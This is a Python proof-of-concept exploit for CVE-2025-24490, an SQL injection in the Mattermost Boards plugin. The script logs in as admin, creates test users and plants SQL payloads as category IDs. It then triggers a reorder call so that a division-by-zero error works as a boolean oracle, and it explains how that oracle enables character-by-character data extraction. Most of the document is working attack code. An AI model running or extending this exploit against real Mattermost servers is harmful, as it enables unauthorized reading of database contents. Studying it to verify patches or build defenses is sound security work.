#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Boards Plugin — Error-Based Boolean SQL Injection (Vector 3)
# CVE            : CVE-2025-24490
# Vendor         : Mattermost
# Product        : Mattermost Server (Boards / Focalboard Plugin)
# Affected       : Mattermost ≤ 10.4.1, ≤ 9.11.7; Boards Plugin ≤ v9.0.4
# Fixed          : 10.4.2, 9.11.8; Boards Plugin v9.0.5
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-24490 Vector 3 — Error-based boolean blind SQL injection.

Uses division-by-zero (1/0) vs safe division (1/1) to create a boolean oracle:
    - HTTP 200 = SQL expression evaluated successfully
    - HTTP 500 = SQL error occurred (division by zero)

Each test uses a separate user to ensure clean category state (category
IDs are primary keys — no duplicates allowed across users).

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24490
    - https://github.com/advisories/GHSA-p4jg-qmjv-9x26
"""

import sys
import json
import time
import http.client


# ─── Configuration ──────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8065
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!@#"

# Error-based payloads (each 17 chars, fits varchar(36)):
# Safe: '||(N/N)::text||'  → evaluates to string '1', no error
# Error: '||(N/0)::text||' → division by zero → HTTP 500


def api_request(host, port, method, path, body=None, token=None):
    """Make an HTTP request and return (status, headers_dict, body_dict)."""
    conn = http.client.HTTPConnection(host, port, timeout=30)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if "focalboard" in path or "plugins" in path:
        headers["X-Requested-With"] = "XMLHttpRequest"
    data = json.dumps(body).encode() if body else None
    conn.request(method, path, body=data, headers=headers)
    resp = conn.getresponse()
    resp_headers = dict(resp.getheaders())
    raw = resp.read().decode()
    conn.close()
    try:
        return resp.status, resp_headers, json.loads(raw)
    except json.JSONDecodeError:
        return resp.status, resp_headers, {"raw": raw}


def login(host, port, username, password):
    """Login and return (token, user_id) or (None, None)."""
    status, headers, body = api_request(host, port, "POST", "/api/v4/users/login",
                                        {"login_id": username, "password": password})
    if status != 200:
        return None, None
    token = None
    for k, v in headers.items():
        if k.lower() == "token":
            token = v
    return token, body.get("id")


def create_user_and_join_team(host, port, admin_token, team_id, suffix):
    """Create a fresh user and add them to the team. Returns (username, password, user_id, token)."""
    username = f"booltest{suffix}"
    password = "TestPass123!"
    email = f"{username}@test.local"

    # Create user
    status, _, body = api_request(host, port, "POST", "/api/v4/users",
                                  {"email": email, "username": username, "password": password})
    user_id = body.get("id", "")
    if not user_id:
        return None, None, None, None

    # Add to team
    api_request(host, port, "POST", f"/api/v4/teams/{team_id}/members",
                {"team_id": team_id, "user_id": user_id}, token=admin_token)

    # Login
    token, _ = login(host, port, username, password)
    return username, password, user_id, token


def test_boolean_payload(host, port, token, user_id, team_id, payload, label):
    """
    Create a category with the payload ID and trigger reorder.
    Returns the HTTP status code from the reorder call.
    """
    print(f"\n    [{label}] Payload: {payload} ({len(payload)} chars)")

    # Create category with payload as ID
    cat_body = {
        "id": payload,
        "name": f"test-{label}",
        "userID": user_id,
        "teamID": team_id,
        "type": "custom",
    }
    status, _, resp = api_request(host, port, "POST",
                                  f"/plugins/focalboard/api/v2/teams/{team_id}/categories",
                                  cat_body, token=token)
    print(f"    Create category: HTTP {status}")
    if status != 200:
        print(f"    Error: {resp}")
        return None

    # List categories
    status, _, cats = api_request(host, port, "GET",
                                  f"/plugins/focalboard/api/v2/teams/{team_id}/categories",
                                  token=token)
    cat_ids = [c["id"] for c in cats]

    if payload not in cat_ids:
        print(f"    Payload not found in categories")
        return None

    # Trigger reorder
    status, _, body = api_request(host, port, "PUT",
                                  f"/plugins/focalboard/api/v2/teams/{team_id}/categories/reorder",
                                  cat_ids, token=token)
    print(f"    Reorder: HTTP {status}")
    return status


def exploit(target_host, target_port):
    """
    Demonstrate error-based boolean SQL injection oracle.

    Creates TWO separate users, each with a single injected category:
    - User A: safe payload (N/N = valid division) → expects HTTP 200
    - User B: error payload (N/0 = division by zero) → expects HTTP 500

    The difference in HTTP status codes proves an error-based boolean oracle:
    the server evaluates arbitrary SQL expressions during the CASE WHEN,
    and errors propagate as HTTP 500 responses.
    """

    # ── Admin setup ─────────────────────────────────────────────────────────
    print("[*] Setting up test environment...")
    admin_token, admin_uid = login(target_host, target_port, ADMIN_USER, ADMIN_PASS)
    if not admin_token:
        print("[-] Admin login failed")
        return False
    print(f"[+] Admin authenticated")

    status, _, teams = api_request(target_host, target_port, "GET",
                                   "/api/v4/users/me/teams", token=admin_token)
    if status != 200 or not teams:
        print("[-] No teams found")
        return False
    team_id = teams[0]["id"]
    print(f"[+] Team: {team_id}")

    ts = str(int(time.time()))
    # Use unique divisor numbers derived from timestamp to avoid PK collisions
    # Category IDs are primary keys — once created, the same ID cannot be reused
    safe_n = (int(ts) % 900) + 10  # e.g., 137
    err_n = safe_n + 1             # e.g., 138

    # ── Test A: Safe payload (should succeed → HTTP 200) ────────────────────
    print("\n" + "-" * 50)
    print("  TEST A: Safe division payload (should → HTTP 200)")
    print("-" * 50)

    user_a, _, uid_a, tok_a = create_user_and_join_team(
        target_host, target_port, admin_token, team_id, f"s{ts}")
    if not tok_a:
        print("[-] Could not create test user A")
        return False
    print(f"    User: {user_a} ({uid_a})")

    safe_payload = f"'||({safe_n}/{safe_n})::text||'"
    safe_status = test_boolean_payload(target_host, target_port, tok_a, uid_a,
                                       team_id, safe_payload, "safe-div")

    # ── Test B: Error payload (should fail → HTTP 500) ──────────────────────
    print("\n" + "-" * 50)
    print("  TEST B: Division-by-zero payload (should → HTTP 500)")
    print("-" * 50)

    user_b, _, uid_b, tok_b = create_user_and_join_team(
        target_host, target_port, admin_token, team_id, f"e{ts}")
    if not tok_b:
        print("[-] Could not create test user B")
        return False
    print(f"    User: {user_b} ({uid_b})")

    error_payload = f"'||({err_n}/0)::text||'"
    error_status = test_boolean_payload(target_host, target_port, tok_b, uid_b,
                                        team_id, error_payload, "div-by-zero")

    # ── Results ─────────────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    print(f"  Safe payload  (2/2):  HTTP {safe_status}")
    print(f"  Error payload (3/0):  HTTP {error_status}")
    print()

    if safe_status == 200 and error_status == 500:
        print("[+] ERROR-BASED BOOLEAN ORACLE CONFIRMED!")
        print()
        print("  Proof:")
        print("    '||(2/2)::text||' → CASE WHEN ''||'1'||'' → HTTP 200")
        print("    '||(3/0)::text||' → CASE WHEN division_by_zero → HTTP 500")
        print()
        print("  The database evaluates SQL expressions inside the CASE WHEN")
        print("  clause. Errors propagate as HTTP 500 (vs 200 for success).")
        print()
        print("  This boolean oracle enables data extraction:")
        print("    If (condition) → trigger 1/0 → HTTP 500 = TRUE")
        print("    Else          → 1/1         → HTTP 200 = FALSE")
        print("  Extraction is character-by-character within varchar(36).")
        print("=" * 60)
        return True
    elif error_status == 500:
        print("[+] PARTIAL CONFIRMATION: Error payload triggered HTTP 500")
        print(f"    Safe payload returned HTTP {safe_status} (expected 200)")
        print("    SQL injection confirmed via error generation")
        print("=" * 60)
        return True
    else:
        print("[-] ERROR-BASED ORACLE NOT CONFIRMED")
        print(f"    Error payload: HTTP {error_status} (expected 500)")
        print(f"    Safe payload:  HTTP {safe_status} (expected 200)")
        print("=" * 60)
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    print("=" * 60)
    print("  CVE-2025-24490 PoC Vector 3: Error-Based Boolean Oracle")
    print("  SQL Injection via division-by-zero in CASE WHEN")
    print(f"  Target: {host}:{port}")
    print("=" * 60)
    success = exploit(host, port)
    sys.exit(0 if success else 1)
